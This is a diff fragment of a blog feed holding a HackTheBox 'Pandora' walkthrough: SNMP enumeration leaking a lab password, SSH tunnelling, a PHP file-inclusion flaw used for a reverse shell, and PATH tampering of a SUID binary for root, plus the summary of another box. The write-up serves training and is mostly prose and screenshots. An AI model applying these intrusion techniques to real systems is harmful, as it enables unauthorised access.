-<h3 id="about">About</h3>
-<p><br /></p>
-
-<p><img src="/assets/img/20220208055528.png" alt="" /></p>
-
-<p><img src="/assets/img/20220208055557.png" alt="" /></p>
-
-<p><br /></p>
-
-<hr />
-<h3 id="recon">Recon</h3>
-<p><br /></p>
-
-<h4 id="nmap">NMAP</h4>
-
-<pre><code class="language-raw"># Nmap 7.70 scan initiated Fri Jan 28 14:55:17 2022 as: nmap -sS -sV -v -oN nmap.txt 10.10.11.136
-Nmap scan report for pandora.htb (10.10.11.136)
-Host is up (0.29s latency).
-Not shown: 998 closed ports
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Read data files from: /usr/bin/../share/nmap
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Fri Jan 28 14:59:09 2022 -- 1 IP address (1 host up) scanned in 232.39 seconds
-</code></pre>
-
-<p><br /></p>
-
-<h4 id="web">Web</h4>
-
-<p><img src="/assets/img/20220208060055.png" alt="" /></p>
-
-<p>The site has a contact-us form that does generate a request, but the response, which just returns the homepage of the site, does not change no matter what I did to the parameters;</p>
-
-<p><img src="/assets/img/20220208060341.png" alt="" /></p>
-
-<p>Bruteforcing the web root for hidden files, and also for hidden subdomains didn’t give me anything of use. A quick UDP port scan with NMAP showed port <strong>161</strong> (SNMP) is open. So I scanned it deeper with <code class="language-plaintext highlighter-rouge">-sU -sC -sV</code> flags, and found a credential <code class="language-plaintext highlighter-rouge">daniel</code>:<code class="language-plaintext highlighter-rouge">HotelBabylon23</code> that is being passed to a script as command line argument;</p>
-
-<p><img src="/assets/img/20220208061826.png" alt="" /></p>
-
-<p>The script that did this enumeration is <code class="language-plaintext highlighter-rouge">snmp-processes</code>, which is used to discover running processes on a host running SNMP. Using the credential, I was able to get access to the box over SSH;</p>
-
-<p><img src="/assets/img/20220208062306.png" alt="" /></p>
-
-<p><br /></p>
-
-<hr />
-<h3 id="user">User</h3>
-<p><br /></p>
-
-<h4 id="pandorapandahtb">pandora.panda.htb</h4>
-
-<p>After poking around a little inside the box, the apache configuration file at <code class="language-plaintext highlighter-rouge">/etc/apache2/sites-available/pandora.conf</code> showed a hidden subdomain;</p>
-
-<p><img src="/assets/img/20220208063020.png" alt="" /></p>
-
-<p>I added the hostname to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file, but was unable to access it as on request the server simply returns that static web page at <code class="language-plaintext highlighter-rouge">pandora.htb/</code>. Notice in the first line of the Apache2 config that the hostname for the virtual host is <strong>localhost</strong>. This means the domain is accessible only locally. So with my SSH access into the box, I setup an SSH tunnel so I can access the site over port <strong>8888</strong> on my attack host;</p>
-
-<p><img src="/assets/img/20220209212210.png" alt="" /></p>
-
-<p>Then I updated my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file;</p>
-
-<p><img src="/assets/img/20220209212316.png" alt="" /></p>
-
-<p>And it worked;</p>
-
-<p><img src="/assets/img/20220209212416.png" alt="" /></p>
-
-<p>I couldn’t read the <code class="language-plaintext highlighter-rouge">include/config.php</code> file as it is owned by <strong>matt</strong> and the permissions were locked down.</p>
-
-<p>A search in <code class="language-plaintext highlighter-rouge">searchsploit</code> for exploits targeting this service gave a bunch of results;</p>
-
-<p><img src="/assets/img/20220208064507.png" alt="" /></p>
-
-<p>Testing the credentials of <strong>daniel</strong>, I was able to get a different response that indicates a valid credential, with possibly restricted permissions;</p>
-
-<p><img src="/assets/img/20220208064935.png" alt="" /></p>
-
-<p>I have no idea what this API is, so I went back into the box as <strong>daniel</strong>, and start going through the source code of the web app. Inside the <code class="language-plaintext highlighter-rouge">include/</code> folder, I found a file named <code class="language-plaintext highlighter-rouge">api.php</code>, which likely contains the implementation of the API I have access to.</p>
-
-<p>Sending a request to the URL at <code class="language-plaintext highlighter-rouge">/include/api.php</code> gave me this;</p>
-
-<p><img src="/assets/img/20220208130155.png" alt="" /></p>
-
-<p>So I started poking around at the source code of the API to figure out how it works. It accepts username and password through the GET parameters <code class="language-plaintext highlighter-rouge">user</code> and <code class="language-plaintext highlighter-rouge">pass</code> respectively. Supplying the creds of <strong>daniel</strong> gave me a different output;</p>
-
-<p><img src="/assets/img/20220208130355.png" alt="" /></p>
-
-<p>Reviewing the source code even more, I realized it expects to be told the task to perform using the parameter <code class="language-plaintext highlighter-rouge">op</code>;</p>
-
-<p><img src="/assets/img/20220208130613.png" alt="" /></p>
-
-<p>The above gave us three valid values for the <code class="language-plaintext highlighter-rouge">op</code> parameter, which are <code class="language-plaintext highlighter-rouge">get</code>, <code class="language-plaintext highlighter-rouge">set</code>, and <code class="language-plaintext highlighter-rouge">help</code>. Looking further into the source code revealed something nice;</p>
-
-<p><img src="/assets/img/20220208130832.png" alt="" /></p>
-
-<p>If I can control the value assigned to the variable <code class="language-plaintext highlighter-rouge">$ext_name</code>, I can control the file that will be included, which I could exploit to load PHP files for <em>arbitrary code execution</em>. Turns out I can, because <code class="language-plaintext highlighter-rouge">$ext_name</code> is assigned the value of a GET parameter;</p>
-
-<p><img src="/assets/img/20220208131814.png" alt="" /></p>
-
-<p>So I logged back into the box and into <code class="language-plaintext highlighter-rouge">/dev/shm/.0</code> directory, and created a PHP script named <code class="language-plaintext highlighter-rouge">.api.php</code> containing my reverse shell;</p>
-
-<p><img src="/assets/img/20220209213324.png" alt="" /></p>
-
-<p>I then have the web app execute the script using the request;</p>
-
-<p><img src="/assets/img/20220209213432.png" alt="" /></p>
-
-<p>Sending this, I got a shell as the user <strong>matt</strong>;</p>
-
-<p><img src="/assets/img/20220209213723.png" alt="" /></p>
-
-<p><br /></p>
-
-<hr />
-<h3 id="privesc">PrivEsc</h3>
-<p><br /></p>
-
-<p>The user <strong>matt</strong> does not have sudo permissions on any file in the box. Searching for SUID binaries gave an interesting result;</p>
-
-<p><img src="/assets/img/20220209214320.png" alt="" /></p>
-
-<p>It’s a binary file, so I shipped it over to my attack host and opened it in <code class="language-plaintext highlighter-rouge">radare2</code>. Dumping strings contained in the binary revealed a possible command that could be vulnerable to <em>path tampering</em>;</p>
-
-<p><img src="/assets/img/20220209214759.png" alt="" /></p>
-
-<p>I checked if it’s indeed used as a command by listing all references to it using the command <code class="language-plaintext highlighter-rouge">axt @ &lt;address&gt;</code>. I got one match in the <code class="language-plaintext highlighter-rouge">main()</code> function;</p>
-
-<p><img src="/assets/img/20220209215056.png" alt="" /></p>
-
-<p>Using my shell on the box as <strong>matt</strong>, I moved to a writeable directory, created a file named <code class="language-plaintext highlighter-rouge">tar</code> containing a reverse shell, made it executable, added it to the <code class="language-plaintext highlighter-rouge">$PATH</code> variable, and called the <code class="language-plaintext highlighter-rouge">pandora_backup</code> script. This gave me root access to the box;</p>
-
-<p><img src="/assets/img/20220209222448.png" alt="" /></p>
-
-<p><img src="/assets/img/20220209222501.png" alt="" /></p>
-
-<p><br /></p>
-
-<hr />
-<h3 id="summary">Summary</h3>
-<p><br /></p>
-
-<ul>
-  <li>Identified port <strong>22</strong> and <strong>80</strong>.</li>
-  <li>UDP port scan revealed port <strong>161</strong> (SNMP) is open.</li>
-  <li>NMAP’s <code class="language-plaintext highlighter-rouge">snmp-process</code> revealed a password for a user named <strong>daniel</strong>, which gave access to the box over SSH.</li>
-  <li>Inside as <strong>daniel</strong>
-    <ul>
-      <li>Found a vhost configured with apache that is accessible only locally.</li>
-      <li>Setup a tunnel through SSH to access the site from my box.</li>
-      <li>Found a vulnerable API that can be exploited for <em>code execution</em> as the user <strong>matt</strong>.</li>
-    </ul>
-  </li>
-  <li>Inside as <strong>matt</strong>
-    <ul>
-      <li>Found a custom SUID script.</li>
-      <li>Basic analysis with <code class="language-plaintext highlighter-rouge">radare2</code> showed it’s vulnerable to <em>path tampering</em>.</li>
-      <li>Exploited it to gain code execution as <em>root</em>.</li>
-    </ul>
-  </li>
-</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="snmp" /><category term="vhost" /><category term="apache" /><category term="php" /><category term="static analysis" /><category term="lfi" /><category term="suid" /><category term="reverse engineering" /><category term="path tampering" /><category term="radare2" /><summary type="html"><![CDATA[Pandora is an easy linux box. It starts with a website, which you don’t really need because foothold involves enumerating an SNMP service on port 161 (UDP) for running processes, which will give you the credentials of a local user. This will give you SSH access to the box, which you will use to setup a tunnel to an apache vhost that’s accessible only locally. This site is vulnerable to LFI ( I later found out this is unintended, and never got around to actually doing the box the intended way :p ) which you can use to move to another local user, and from there exploit a custom SUID binary through path tampering to gain code execution as root.]]></summary></entry></feed>
+</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="adminer" /><category term="mysql" /><category term="php" /><category term="ssrf" /><category term="opentsdb" /><category term="rce" /><category term="opencats" /><category term="fail2ban" /><category term="whois" /><category term="object injection" /><category term="insecure deserialization" /><category term="phpggc" /><summary type="html"><![CDATA[AdmirerToo is a hard-rated linux box. It starts with an SSRF exploit on Adminer to access an instance of OpenTSDB on port 4242, which is vulnerable to RCE. This will give you a shell on the box as opentsdb, which you can use to extract credentials from a configuration file and gain access to the account of jennifer due to password reuse. An instance of OpenCATS is running locally on port 8080, which you can access by setting up an SSH tunnel. OpenCATS is running as the user devel, who has write permissions on the directory /usr/local/etc, and is vulnerable object injection that you can use to write files in the directory, and exploit the Fail2Ban service to gain code execution as root.]]></summary></entry></feed>
